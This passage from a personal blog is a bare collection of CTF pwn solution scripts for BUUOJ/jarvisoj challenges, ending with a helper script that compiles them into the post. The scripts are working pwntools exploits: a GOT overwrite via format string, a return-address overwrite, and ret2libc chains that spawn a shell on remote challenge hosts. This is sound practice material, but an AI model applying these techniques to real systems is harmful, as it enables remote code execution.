class="line">__stack_chk_fail &#x3D; elf.got[&#39;__stack_chk_fail&#39;]</span><br><span class="line">payload &#x3D; &#39;aaa%61c%9$hn%1510c%10$hn&#39;+p64(__stack_chk_fail+2)+p64(__stack_chk_fail)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.31 jarvisoj_tell_me_something_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;jarvisoj_tell_me_something&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26222)</span><br><span class="line">elf &#x3D; ELF(&#39;jarvisoj_tell_me_something&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">good_game &#x3D; 0x000400620</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88)+p64(0x0400620)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.32 jarvisoj_level4_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;jarvisoj_level4&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26528)</span><br><span class="line">elf &#x3D; ELF(&#39;jarvisoj_level4&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4) + p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr &#x3D; u32(p.recv(4))</span><br><span class="line">print hex(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">system  &#x3D; libc.dump(&#39;system&#39;) + offset</span><br><span class="line">binsh &#x3D; libc.dump(&#39;str_bin_sh&#39;) + offset</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4) + p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.33 jarvisoj_level3_x64_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;jarvisoj_level3_x64&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29849)</span><br><span class="line">elf &#x3D; ELF(&#39;jarvisoj_level3_x64&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x00000000004006b3</span><br><span class="line">pop_rsi_r15 &#x3D; 0x00000000004006b1</span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">#print hex(write_plt),hex(write_got)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x80+8)+p64(pop_rdi) + p64(1) </span><br><span class="line">payload +&#x3D; p64(pop_rsi_r15)+p64(write_got)+p64(0)+p64(write_plt)+p64(main)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr &#x3D; u64(p.recv(8))</span><br><span class="line">print hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">system  &#x3D; libc.dump(&#39;system&#39;) + offset</span><br><span class="line">binsh &#x3D; libc.dump(&#39;str_bin_sh&#39;) + offset</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x80+8) +p64(pop_rdi)+p64(binsh)+p64(system)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.34 1exp2txt(for blog)_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">import os</span><br><span class="line">s&#x3D;0</span><br><span class="line">f1 &#x3D; open(&#39;1exp.txt&#39;,&#39;w&#39;)</span><br><span class="line">dir_list &#x3D; []</span><br><span class="line">for root,dire,files in os.walk(&#39;.&#x2F;&#39;):</span><br><span class="line">	for i in files:</span><br><span class="line">		if os.path.splitext(i)[1] &#x3D;&#x3D; &#39;.py&#39;:</span><br><span class="line">			dir_list.append(i)</span><br><span class="line">dir_list &#x3D; sorted(dir_list,key&#x3D;lambda x: os.path.getmtime(os.path.join(&#39;.&#x2F;&#39;, x)))</span><br><span class="line">for i in dir_list:</span><br><span class="line">	with open(i,&#39;r&#39;) as f:</span><br><span class="line">		f1.write(&#39;\n#NO.&#39;+str(s).rjust(2,&#39;0&#39;)+&#39; &#39;+i.split(&#39;.&#39;)[0]+&#39;\n\n###exp\n&#96;&#96;&#96;\n&#39;)</span><br><span class="line">		f1.write(f.read())</span><br><span class="line">		f1.write(&#39;&#96;&#96;&#96;\n\n\n&#39;)</span><br><span class="line">		s+&#x3D;1</span><br><span class="line">		</span><br></pre></td></tr></table></figure>
    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/09/21/guestbook/" rel="prev" title="guestbook">
                  <i class="fa fa-chevron-left"></i> guestbook
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
  
  
  



      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Adam</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '.page-configurations',
    '.main-inner',
    '.post-toc-wrap',
    '.languages',
    '.pjax'
  ],
  analytics: false,
  cacheBust: false,
  scrollRestoration: false,
  scrollTo: !CONFIG.bookmark.enable
});

document.addEventListener('pjax:success', () => {
  pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  const hasTOC = document.querySelector('.post-toc');
  document.querySelector('.sidebar-inner').classList.toggle('sidebar-nav-active', hasTOC);
  document.querySelector(hasTOC ? '.sidebar-nav-toc' : '.sidebar-nav-overview').click();
  NexT.utils.updateSidebarPosition();
});
</script>


  


















  








    <div class="pjax">
  

  

    </div>
</body>
</html>
